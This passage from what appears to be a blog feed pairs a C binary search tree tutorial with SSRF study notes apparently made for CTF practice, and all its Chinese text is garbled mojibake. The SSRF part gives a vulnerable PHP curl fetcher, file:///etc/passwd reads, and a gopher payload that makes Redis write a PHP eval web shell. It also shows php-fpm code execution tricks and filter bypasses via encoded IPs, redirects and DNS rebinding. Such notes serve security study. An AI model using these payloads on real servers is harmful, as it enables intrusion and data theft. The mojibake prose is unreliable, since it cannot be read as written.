class="hljs-function"><span class="hljs-title">left</span> = newNode-&gt;</span>right = NULL;<br>        return newNode;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-title">if</span> (value &lt; root-&gt;</span><span class="hljs-keyword">data</span>) &#123;<br>        <span class="hljs-function"><span class="hljs-title">root</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">left</span> = insert(root-&gt;</span>left, value);  <span class="hljs-comment">// æ’å…¥åˆ°å·¦å­æ ‘</span><br>    &#125; <span class="hljs-function"><span class="hljs-title">else</span> <span class="hljs-keyword">if</span> (value &gt; root-&gt;</span><span class="hljs-keyword">data</span>) &#123;<br>        <span class="hljs-function"><span class="hljs-title">root</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">right</span> = insert(root-&gt;</span>right, value);  <span class="hljs-comment">// æ’å…¥åˆ°å³å­æ ‘</span><br>    &#125;<br>    return root;<br>&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾æ“ä½œï¼ˆSearchï¼‰</p><p>æŸ¥æ‰¾æ“ä½œç”¨äºåˆ¤æ–­æŸä¸ªå€¼æ˜¯å¦åœ¨äºŒå‰æ’åºæ ‘ä¸­ã€‚æŸ¥æ‰¾çš„è¿‡ç¨‹ä¸æ’å…¥ç±»ä¼¼ï¼Œä»æ ¹èŠ‚ç‚¹å¼€å§‹ï¼Œä¾æ¬¡å‘å·¦æˆ–å‘å³å­æ ‘ç§»åŠ¨ï¼Œç›´åˆ°æ‰¾åˆ°ç›®æ ‡èŠ‚ç‚¹æˆ–åˆ°è¾¾å¶å­èŠ‚ç‚¹ã€‚</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xl">TreeNode* search(TreeNode* root, int value) &#123;<br>    <span class="hljs-function"><span class="hljs-title">if</span> (root == NULL || root-&gt;</span><span class="hljs-keyword">data</span> == value) &#123;<br>        return root;  <span class="hljs-comment">// å¦‚æœæ‰¾åˆ°å€¼æˆ–åˆ°è¾¾ç©ºèŠ‚ç‚¹</span><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-title">if</span> (value &lt; root-&gt;</span><span class="hljs-keyword">data</span>) &#123;<br>        <span class="hljs-function"><span class="hljs-title">return</span> search(root-&gt;</span>left, value);  <span class="hljs-comment">// åœ¨å·¦å­æ ‘æŸ¥æ‰¾</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-function"><span class="hljs-title">return</span> search(root-&gt;</span>right, value);  <span class="hljs-comment">// åœ¨å³å­æ ‘æŸ¥æ‰¾</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>åˆ é™¤æ“ä½œï¼ˆDeleteï¼‰</li></ol><p>åˆ é™¤æ“ä½œæœ‰ä¸‰ç§æƒ…å†µï¼š</p><ol><li><strong>åˆ é™¤å¶å­èŠ‚ç‚¹</strong>ï¼šç›´æ¥åˆ é™¤è¯¥èŠ‚ç‚¹ã€‚</li><li><strong>åˆ é™¤åªæœ‰ä¸€ä¸ªå­èŠ‚ç‚¹çš„èŠ‚ç‚¹</strong>ï¼šå°†è¯¥èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹æŒ‡å‘è¯¥èŠ‚ç‚¹çš„å”¯ä¸€å­èŠ‚ç‚¹ã€‚</li><li><strong>åˆ é™¤æœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹çš„èŠ‚ç‚¹</strong>ï¼šæ‰¾åˆ°è¯¥èŠ‚ç‚¹çš„ä¸­åºåç»§ï¼ˆå³å­æ ‘ä¸­æœ€å°çš„èŠ‚ç‚¹ï¼‰æˆ–ä¸­åºå‰é©±ï¼ˆå·¦å­æ ‘ä¸­æœ€å¤§çš„èŠ‚ç‚¹ï¼‰ï¼Œç”¨å®ƒæ›¿æ¢è¯¥èŠ‚ç‚¹ï¼Œç„¶ååˆ é™¤ä¸­åºåç»§æˆ–å‰é©±èŠ‚ç‚¹ã€‚</li></ol><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs xl">TreeNode* minValueNode(TreeNode* node) &#123;<br>    TreeNode* current = node;<br>    <span class="hljs-function"><span class="hljs-title">while</span> (current &amp;&amp; current-&gt;</span>left != NULL) &#123;<br>        <span class="hljs-function"><span class="hljs-title">current</span> = current-&gt;</span>left;  <span class="hljs-comment">// æŸ¥æ‰¾å·¦å­æ ‘çš„æœ€å°èŠ‚ç‚¹</span><br>    &#125;<br>    return current;<br>&#125;<br><br>TreeNode* deleteNode(TreeNode* root, int value) &#123;<br>    <span class="hljs-keyword">if</span> (root == NULL) return root;<br>    <br>    <span class="hljs-function"><span class="hljs-title">if</span> (value &lt; root-&gt;</span><span class="hljs-keyword">data</span>) &#123;<br>        <span class="hljs-function"><span class="hljs-title">root</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">left</span> = deleteNode(root-&gt;</span>left, value);  <span class="hljs-comment">// åˆ é™¤å·¦å­æ ‘ä¸­çš„èŠ‚ç‚¹</span><br>    &#125; <span class="hljs-function"><span class="hljs-title">else</span> <span class="hljs-keyword">if</span> (value &gt; root-&gt;</span><span class="hljs-keyword">data</span>) &#123;<br>        <span class="hljs-function"><span class="hljs-title">root</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">right</span> = deleteNode(root-&gt;</span>right, value);  <span class="hljs-comment">// åˆ é™¤å³å­æ ‘ä¸­çš„èŠ‚ç‚¹</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// å¤„ç†åˆ é™¤èŠ‚ç‚¹çš„ä¸‰ç§æƒ…å†µ</span><br>        <span class="hljs-function"><span class="hljs-title">if</span> (root-&gt;</span>left == NULL) &#123;<br>            T<span class="hljs-function"><span class="hljs-title">reeNode</span>* temp = root-&gt;</span>right;<br>            free(root);<br>            return temp;<br>        &#125; <span class="hljs-function"><span class="hljs-title">else</span> <span class="hljs-keyword">if</span> (root-&gt;</span>right == NULL) &#123;<br>            T<span class="hljs-function"><span class="hljs-title">reeNode</span>* temp = root-&gt;</span>left;<br>            free(root);<br>            return temp;<br>        &#125;<br>        <br>        <span class="hljs-comment">// æ‰¾åˆ°å³å­æ ‘ä¸­çš„æœ€å°èŠ‚ç‚¹ï¼Œå¹¶ç”¨å®ƒæ›¿æ¢å½“å‰èŠ‚ç‚¹</span><br>        T<span class="hljs-function"><span class="hljs-title">reeNode</span>* temp = minValueNode(root-&gt;</span>right);<br>        <span class="hljs-function"><span class="hljs-title">root</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">data</span> = temp-&gt;</span><span class="hljs-keyword">data</span>;<br>        <span class="hljs-function"><span class="hljs-title">root</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">right</span> = deleteNode(root-&gt;</span><span class="hljs-function"><span class="hljs-title">right</span>, temp-&gt;</span><span class="hljs-keyword">data</span>);  <span class="hljs-comment">// åˆ é™¤å³å­æ ‘ä¸­çš„æœ€å°èŠ‚ç‚¹</span><br>    &#125;<br>    return root;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-ä¸­åºéå†ï¼ˆInorder-Traversalï¼‰"><a href="#4-ä¸­åºéå†ï¼ˆInorder-Traversalï¼‰" class="headerlink" title="4. ä¸­åºéå†ï¼ˆInorder Traversalï¼‰"></a>4. ä¸­åºéå†ï¼ˆInorder Traversalï¼‰</h4><p><strong>ä¸­åºéå†</strong>å¯ä»¥æŒ‰å‡åºè¾“å‡ºäºŒå‰æ’åºæ ‘ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ã€‚åœ¨äºŒå‰æ’åºæ ‘ä¸­ï¼Œä¸­åºéå†çš„ç»“æœæ€»æ˜¯<strong>é€’å¢çš„</strong>ã€‚</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">void <span class="hljs-built_in">inorder</span>(TreeNode* root) &#123;<br>    if (root != NULL) &#123;<br>        <span class="hljs-built_in">inorder</span>(root-&gt;left);  <span class="hljs-comment">// å…ˆéå†å·¦å­æ ‘</span><br>        <span class="hljs-built_in">printf</span>(&quot;%d &quot;, root-&gt;data);  <span class="hljs-comment">// ç„¶åè®¿é—®å½“å‰èŠ‚ç‚¹</span><br>        <span class="hljs-built_in">inorder</span>(root-&gt;right);  <span class="hljs-comment">// æœ€åéå†å³å­æ ‘</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5-å‰åºéå†ï¼ˆPreorder-Traversalï¼‰"><a href="#5-å‰åºéå†ï¼ˆPreorder-Traversalï¼‰" class="headerlink" title="5. å‰åºéå†ï¼ˆPreorder Traversalï¼‰"></a>5. å‰åºéå†ï¼ˆPreorder Traversalï¼‰</h4><p><strong>å‰åºéå†</strong>çš„é¡ºåºæ˜¯ï¼šå…ˆè®¿é—®æ ¹èŠ‚ç‚¹ï¼Œå†éå†å·¦å­æ ‘ï¼Œæœ€åéå†å³å­æ ‘ã€‚</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">void <span class="hljs-built_in">preorder</span>(TreeNode* root) &#123;<br>    if (root != NULL) &#123;<br>        <span class="hljs-built_in">printf</span>(&quot;%d &quot;, root-&gt;data);  <span class="hljs-comment">// è®¿é—®å½“å‰èŠ‚ç‚¹</span><br>        <span class="hljs-built_in">preorder</span>(root-&gt;left);  <span class="hljs-comment">// éå†å·¦å­æ ‘</span><br>        <span class="hljs-built_in">preorder</span>(root-&gt;right);  <span class="hljs-comment">// éå†å³å­æ ‘</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="6-ååºéå†ï¼ˆPostorder-Traversalï¼‰"><a href="#6-ååºéå†ï¼ˆPostorder-Traversalï¼‰" class="headerlink" title="6. ååºéå†ï¼ˆPostorder Traversalï¼‰"></a>6. ååºéå†ï¼ˆPostorder Traversalï¼‰</h4><p><strong>ååºéå†</strong>çš„é¡ºåºæ˜¯ï¼šå…ˆéå†å·¦å­æ ‘ï¼Œå†éå†å³å­æ ‘ï¼Œæœ€åè®¿é—®æ ¹èŠ‚ç‚¹ã€‚</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">void <span class="hljs-built_in">postorder</span>(TreeNode* root) &#123;<br>    if (root != NULL) &#123;<br>        <span class="hljs-built_in">postorder</span>(root-&gt;left);  <span class="hljs-comment">// éå†å·¦å­æ ‘</span><br>        <span class="hljs-built_in">postorder</span>(root-&gt;right);  <span class="hljs-comment">// éå†å³å­æ ‘</span><br>        <span class="hljs-built_in">printf</span>(&quot;%d &quot;, root-&gt;data);  <span class="hljs-comment">// è®¿é—®å½“å‰èŠ‚ç‚¹</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cè¯­è¨€çš„æ•°æ®ç»“æ„</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cè¯­è¨€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssrf</title>
    <link href="/2024/09/01/ssrf/"/>
    <url>/2024/09/01/ssrf/</url>
    
    <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>Server-side Request Forgery æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ <br>æ”»å‡»å‘æœåŠ¡ç«¯å‘é€åŒ…å«æ¶æ„urlè¿æ¥çš„è¯·æ±‚ï¼Œå€Ÿç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚<br>ä»¥ä¾¿è·å–æœåŠ¡ç«¯ç½‘ç»œå†…éƒ¨çš„èµ„æº<br>ä¸€å¥è¯æ€»ç»“ï¼š<br>æ§åˆ¶æœåŠ¡ç«¯ä½¿ç”¨æŒ‡å®šåè®®è®¿é—®æŒ‡å®šçš„url<br>Aï¼šä½ ä¸ºä»€ä¹ˆè¿™ä¹ˆå¹²ï¼Ÿ<br>Bï¼šæ˜¯è°è°è°è®©æˆ‘å¹²çš„<br>Aï¼šè°è°è°è®©ä½ å»åƒshiä½ å»ä¸å»ï¼Ÿ<br>ç‰¹ç‚¹ï¼š<br>1 è®©åˆ«äººè®¿é—®æˆ‘ä»¬è®¿é—®ä¸åˆ°çš„url<br>2 æ‹¿åˆ°è‡ªå·±æœ¬æ¥æ‹¿ä¸åˆ°çš„æ•°æ®</p><p>æ¡ä»¶ï¼š<br>1 åˆ«äººèƒ½å¸®æˆ‘è®¿é—®url æœåŠ¡ç«¯æœ‰æ¥å—urlåœ°å€å¹¶è¿›è¡Œè®¿é—®çš„åŠŸèƒ½<br>2 urlåœ°å€å¤–éƒ¨å¯æ§<br><a href="https://xxx.com/index.php?url=http://www.baidu.com">https://xxx.com/index.php?url=http://www.baidu.com</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;location:&#x27;</span>.<span class="hljs-variable">$url</span>); <span class="hljs-comment">//302çš„è·³è½¬</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ˜¯ä¸æ˜¯å±äºssrf?</p><p>å‘Šè¯‰æµè§ˆå™¨ï¼Œä½ å»è®¿é—®è¿™ä¸ªåœ°å€<br>æ­¤æ—¶ï¼Œæµè§ˆå™¨ï¼Œæ˜¯å®¢æˆ·ç«¯è¿˜æ˜¯æœåŠ¡ç«¯</p><p>å®¢æˆ·ç«¯   </p><p>æ­¤æ—¶ï¼ŒæœåŠ¡å™¨æ²¡æœ‰è®¿é—®è¿™ä¸ªUrl,åªæ˜¯å‘Šè¯‰ä½ æµè§ˆå™¨ï¼Œå»è·³è½¬åˆ°è¿™ä¸ªåœ°å€å»<br>æ˜¯æµè§ˆå™¨å»è®¿é—®ï¼Œä¸æ˜¯æœåŠ¡ç«¯å»è®¿é—®<br>æ‰€ä»¥ï¼Œä¸æ˜¯SSRF<br>åªèƒ½ç®— ä»»æ„è·³è½¬æ¼<br>åˆ†æ¸…  æ˜¯å¦æ˜¯ssrf<br>urlåœ°å€å¯æ§<br><a href="http://10.xx.xx.xx/">http://10.xx.xx.xx/</a><br>file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>URLæ ¼å¼<br>URI &#x3D; scheme:[&#x2F;&#x2F;authority]path[?query][#fragment]<br>schema: åè®®å¤´:&#x2F;&#x2F;authority [userinfo@]host[:port]</p><p>é»˜è®¤ä½¿ç”¨80ç«¯å£ï¼Œè€Œ80ç«¯å£é»˜è®¤æƒ…å†µä¸‹ï¼Œæ˜¯å¯ä»¥çœç•¥<br><a href="http://www.baidu.com/robots.txt">http://www.baidu.com/robots.txt</a></p><p>æœ¬è´¨ï¼Œå°±æ˜¯ é€šè¿‡æŒ‡å®šçš„åè®®ï¼Œè®¿é—®äº’è”ç½‘ä¸ŠæŸå°æœåŠ¡å™¨çš„æŸä¸ªèµ„æºæˆ–è€…æŸä¸ªæ–‡ä»¶<br>é»˜è®¤ä½¿ç”¨åŒ¿åè´¦æˆ·è®¿é—®<br>userinfo: username:password@hos<br>schema:&#x2F;&#x2F;username:password@host:port&#x2F;path?a&#x3D;b#top<br><a href="http://ctfshow:hacker@www.baidu.com/robots.txt">http://ctfshow:hacker@www.baidu.com/robots.txt</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-comment">//åˆå§‹åŒ–ä¸€ä¸ªcURLä¼šè¯</span><br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-comment">//è®¾å®šè¿”å›ä¿¡æ¯ä¸­åŒ…å«å“åº”ä¿¡æ¯å¤´</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//å¯ç”¨æ—¶ä¼šå°†å¤´æ–‡ä»¶çš„ä¿¡æ¯ä½œä¸ºæ•°æ®æµè¾“å‡ºã€‚ </span><br><span class="hljs-comment">//å‚æ•°ä¸º1è¡¨ç¤ºè¾“å‡ºä¿¡æ¯å¤´,ä¸º0è¡¨ç¤ºä¸è¾“å‡º</span><br> <br><span class="hljs-comment">//è®¾å®šcurl_exec()å‡½æ•°å°†å“åº”ç»“æœè¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡º</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-comment">//å‚æ•°ä¸º1è¡¨ç¤º$result,ä¸º0è¡¨ç¤ºecho $result</span><br> <br><span class="hljs-comment">//æ‰§è¡Œä¸€ä¸ªcURLä¼šè¯</span><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-comment">//å…³é—­ä¸€ä¸ªcurlä¼šè¯</span><br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-comment">//è¾“å‡ºè¿”å›ä¿¡æ¯  å¦‚æœCURLOPT_RETURNTRANSFERå‚æ•°ä¸ºfasleå¯çœç•¥</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="SSRFçš„åˆ©ç”¨é¢"><a href="#SSRFçš„åˆ©ç”¨é¢" class="headerlink" title="SSRFçš„åˆ©ç”¨é¢"></a>SSRFçš„åˆ©ç”¨é¢</h1><p><a href="http://127.0.0.1:8000/fgc.php?url=file:///var/www/html/flag.php">http://127.0.0.1:8000/fgc.php?url=file:///var/www/html/flag.php</a><br><a href="http://127.0.0.1:8000/fgc.php?url=http://127.0.0.1/flag.php">http://127.0.0.1:8000/fgc.php?url=http://127.0.0.1/flag.php</a></p><h2 id="1-ä»»æ„æ–‡ä»¶è¯»å–-å‰ææ˜¯çŸ¥é“è¦è¯»å–çš„æ–‡ä»¶å"><a href="#1-ä»»æ„æ–‡ä»¶è¯»å–-å‰ææ˜¯çŸ¥é“è¦è¯»å–çš„æ–‡ä»¶å" class="headerlink" title="1 ä»»æ„æ–‡ä»¶è¯»å– å‰ææ˜¯çŸ¥é“è¦è¯»å–çš„æ–‡ä»¶å"></a>1 ä»»æ„æ–‡ä»¶è¯»å– å‰ææ˜¯çŸ¥é“è¦è¯»å–çš„æ–‡ä»¶å</h2><h2 id="2-æ¢æµ‹å†…ç½‘èµ„æº"><a href="#2-æ¢æµ‹å†…ç½‘èµ„æº" class="headerlink" title="2 æ¢æµ‹å†…ç½‘èµ„æº"></a>2 æ¢æµ‹å†…ç½‘èµ„æº</h2><p> 127.0.0.1 mysqlæœåŠ¡ç«¯ç›‘å¬äº†127.0.0.1è¿™ä¸ªåœ°å€ï¼Œä¹Ÿå°±è¡¨ç¤ºï¼Œåªèƒ½é€šè¿‡127.0.0.1è¿™ä¸ªIPæ¥è®¿é—®<br> 0.0.0.0 è¡¨ç¤ºå…è®¸ä»»æ„ipè®¿é—®<br> 192.168.233.233 åªå…è®¸ç‰¹å®šçš„IPåœ°å€è®¿é—®<br> 3 ä½¿ç”¨gopheråè®®æ‰©å±•æˆ‘ä»¬çš„æ”»å‡»é¢<br> apache&#x2F;nginx 80<br> tomcat 8080<br> node 3000<br> flask 8080<br> php-fpm 9000<br> mysql 3306<br> ftp 21<br> ssh 22<br> redis 6379<br> key-value  gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;<em>save</em>&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php_<?php eval($_POST[1]);?><br> mysql 3306<br> ç”¨æˆ·å¯†ç ä¸ºç©º<br> php-fpm<br> php-fpm é»˜è®¤ç›‘å¬9000ç«¯å£ï¼Œè€Œä¸”åªå…è®¸æœ¬æœº127.0.0.1è¿™ä¸ªåœ°å€è®¿é—®<br> ä¸»è¦è´Ÿè´£å¯¹.phpæ–‡ä»¶çš„ä»£ç è§£é‡Šæ‰§è¡Œ<br> æˆ‘ä»¬å¯ä»¥é€šè¿‡å‘9000ç«¯å£å‘é€æ ¼å¼çš„è¯·æ±‚ï¼Œæ¥è®©9000ç«¯å£èƒŒåçš„php-fpmå¸®æˆ‘ä»¬å¤„ç†æˆ‘ä»¬æäº¤çš„phpä»£ç <br> é€šè¿‡å‘9000ç«¯å£å‘é€phpæ‰§è¡Œè¯·æ±‚<br> è®¾ç½®php.iniä¸­çš„è¿è¡Œå‚æ•°<br> å…¶ä¸­ä½¿ç”¨ auto_append_file æ¥æŒ‡å®š php:&#x2F;&#x2F;input åŒ…å«æ¶æ„ä»£ç ï¼Œç„¶åæ‰§è¡Œ<br> ä¸ºäº†èƒ½ä½¿ç”¨auto_append_fileå‚æ•°ï¼Œå¿…é¡»æœ‰ä¸€ä¸ªå­˜åœ¨çš„phpæ–‡ä»¶æ¥ä½¿ç”¨è¿™ä¸ªé…ç½®é¡¹<br> phpåŸç”Ÿç±»è¿›è¡Œssrf<br>$soap &#x3D;new SoapClient($_GET[â€˜urlâ€™]);<br>$soap-&gt;hack();<br>&#x2F;&#x2F;$soap-&gt;__call()<br>urlå¯æ§ï¼Œå¯ä»¥å‘é€å†…ç½‘è¯·æ±‚<br>ssrfç»•è¿‡<br>åªè¦ä¸å…è®¸å®ƒè®¿é—®æœ¬åœ°åœ°å€å³å¯ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿‡æ»¤çš„ç›®çš„æ˜¯ï¼Œä¸è®©è®¿é—®127.0.0.1åœ°å€<br>1 enclosed alphanumerics ç»•è¿‡<br>127.0.0.1<br>127.â“¿.â“¿.1<br>2 ä½¿ç”¨IPåœ°å€è½¬æ¢<br>æ‰€æœ‰çš„åŸŸå-&gt;IP<br>ipå¯ä»¥ä½¿ç”¨ä¸åŒè¿›åˆ¶æ¥è¡¨ç¤º<br>127.0.0.1ç”¨ä¸åŒè¿›åˆ¶å¯ä»¥è¡¨ç¤ºä¸º</p><ul><li><p>2130706433  10è¿›åˆ¶ <a href="http://127.0.0.1/">http://2130706433</a>  </p></li><li><p>017700000001 8è¿›åˆ¶ <a href="http://127.0.0.1/">http://017700000001</a> </p></li><li><p>7F000001 16è¿›åˆ¶   <a href="http://127.0.0.1/">http://0x7F000001</a> </p><h2 id="3-ç‰¹æ®Šè¯­æ³•ç»•è¿‡"><a href="#3-ç‰¹æ®Šè¯­æ³•ç»•è¿‡" class="headerlink" title="3 ç‰¹æ®Šè¯­æ³•ç»•è¿‡"></a>3 ç‰¹æ®Šè¯­æ³•ç»•è¿‡</h2><p>Windows ä¸‹ 0 ä»£è¡¨çš„æ˜¯0.0.0.0<br>è€ŒLinux ä¸‹ 0 ä»£è¡¨çš„æ˜¯127.0.0.1<br>127.0.0.1 å¯ä»¥çœç•¥ä¸º 127.1<br>127ã€‚0ã€‚0ã€‚1 å¯ä»¥æ›¿ä»£127.0.0.1<br>4 å¦‚æœå¯¹æ–¹å¯ä»¥æ¥å—302è·³è½¬ï¼Œå¹¶ä¸”è·Ÿè¿›302è·³è½¬<br>å¯ä»¥å‘é€httpçš„åè®®ã€‚ä½†æ˜¯è¿”å›çš„locationä¸ºå…¶ä»–åè®®<br><a href="http://xxx.com/302.php?schema=gopher&host=127.0.0.1&port=9000&payload=xxxx">http://xxx.com/302.php?schema=gopher&amp;host=127.0.0.1&amp;port=9000&amp;payload=xxxx</a><br>(1)ã€æœåŠ¡å™¨ç«¯è·å¾—URLå‚æ•°ï¼Œè¿›è¡Œç¬¬ä¸€æ¬¡DNSè§£æï¼Œè·å¾—äº†ä¸€ä¸ªéå†…ç½‘çš„IP<br>(2)ã€å¯¹äºè·å¾—çš„IPè¿›è¡Œåˆ¤æ–­ï¼Œå‘ç°ä¸ºéé»‘åå•IPï¼Œåˆ™é€šè¿‡éªŒè¯<br>(3)ã€æœåŠ¡å™¨ç«¯å¯¹äºURLè¿›è¡Œè®¿é—®ï¼Œç”±äºDNSæœåŠ¡å™¨è®¾ç½®çš„TTLä¸º0ï¼Œæ‰€ä»¥å†æ¬¡è¿›è¡ŒDNSè§£æï¼Œè¿™ä¸€æ¬¡DNSæœåŠ¡å™¨è¿”å›çš„æ˜¯å†…ç½‘åœ°å€ã€‚<br>(4)ã€ç”±äºå·²ç»ç»•è¿‡éªŒè¯ï¼Œæ‰€ä»¥æœåŠ¡å™¨ç«¯è¿”å›è®¿é—®å†…ç½‘èµ„æºçš„ç»“æœã€‚</p></li></ul><p>compress.zlib:&#x2F;&#x2F;data:@baidu.com&#x2F;baidu.com,phpinfo()<br><code>compress.zlib</code>ç»•è¿‡dataåè®®çš„æ£€æµ‹ï¼Œ<code>@</code>ä½¿<code>data:</code>è¢«è§£é‡Šä¸ºç”¨æˆ·åå’Œå¯†ç ï¼Œ<code>baidu.com/baidu.com</code>ä¸­åªè¦åŒ…å«<code>/</code>å°±ä¼šè¢«è§£é‡Šä¸ºåˆæ³•çš„<code>media-type</code></p><p>1Â·ä¿®æ”¹è‡ªå·±åŸŸåçš„aè®°å½•ï¼Œæ”¹æˆ127.0.0.1<br>2Â·è¿™ä¸ªç½‘ç«™aè®°å½•æŒ‡å‘127.0.0.1 å¯ä»¥ç›´æ¥åˆ©ç”¨<br>url&#x3D;<a href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a></p><ol><li>è®¾ç½®é˜¿é‡Œäº‘ DNS è§£æ<br>é¦–å…ˆï¼Œæ‚¨éœ€è¦ä¸€ä¸ªåœ¨é˜¿é‡Œäº‘ä¸Šæ³¨å†Œçš„åŸŸåï¼Œå¹¶ä¸”æ‚¨éœ€è¦èƒ½å¤Ÿç®¡ç†è¯¥åŸŸåçš„ DNS è®°å½•ã€‚</li></ol><p>åˆ›å»ºåŸŸåå’Œè®¾ç½® DNS è§£æ<br>ç™»å½•åˆ° é˜¿é‡Œäº‘æ§åˆ¶å°ã€‚<br>åœ¨å·¦ä¾§èœå•ä¸­é€‰æ‹©â€œåŸŸåä¸ç½‘ç«™â€ &gt; â€œåŸŸåâ€ï¼Œå¹¶é€‰æ‹©æ‚¨çš„åŸŸåã€‚<br>ç‚¹å‡»â€œè§£æâ€ï¼Œè¿›å…¥ DNS è§£æè®¾ç½®é¡µé¢ã€‚<br>æ·»åŠ  A è®°å½•ï¼š<br>ä¸»æœºè®°å½•ï¼š@<br>è®°å½•ç±»å‹ï¼šA<br>è§£æçº¿è·¯ï¼šé»˜è®¤<br>è®°å½•å€¼ï¼š203.0.113.1ï¼ˆç¬¬ä¸€æ¬¡è¿”å›çš„å¤–éƒ¨ IPï¼‰<br>TTLï¼š1åˆ†é’Ÿ<br>æ³¨æ„ï¼šé˜¿é‡Œäº‘ DNS ä¸æ”¯æŒå°† TTL è®¾ç½®ä¸º 0ï¼Œä½†æ‚¨å¯ä»¥å°†å…¶è®¾ç½®ä¸ºæœ€å°å€¼ï¼Œä¾‹å¦‚ 1 åˆ†é’Ÿã€‚</p><ol start="2"><li>é…ç½®å¯æ§çš„ DNS 